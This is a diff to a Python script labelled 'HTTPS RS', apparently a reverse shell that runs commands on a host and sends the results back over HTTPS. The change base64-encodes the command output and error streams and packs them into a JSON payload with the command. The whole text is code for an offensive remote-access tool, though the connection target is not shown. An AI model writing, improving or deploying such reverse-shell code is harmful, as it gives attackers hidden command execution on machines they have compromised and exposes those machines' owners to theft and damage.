@@ -4,6 +4,7 @@ import ssl
 import argparse
 import time
 import json
+import base64
 
 argument_parser = argparse.ArgumentParser(description='HTTPS RS')
 argument_parser.add_argument("-p", "--port", help='Server port', type=int, required=True)
@@ -59,8 +60,14 @@ while True:
             output_bytes = cmd.stdout.read()
             error_bytes = cmd.stderr.read()
 
-            output_str = output_bytes.decode('utf-8')
-            error_str = error_bytes.decode('utf-8')
+            #output_str = output_bytes.decode('utf-8')
+            #error_str = error_bytes.decode('utf-8')
+
+            output_b64 = base64.b64encode(output_bytes)
+            error_b64 = base64.b64encode(error_bytes)
+
+            output_str = output_b64.decode('utf-8')
+            error_str = error_b64.decode('utf-8')
 
             body = { "com" : command, "output" : output_str, "error" : error_str }
             payload = json.dumps(body).encode("utf-8")
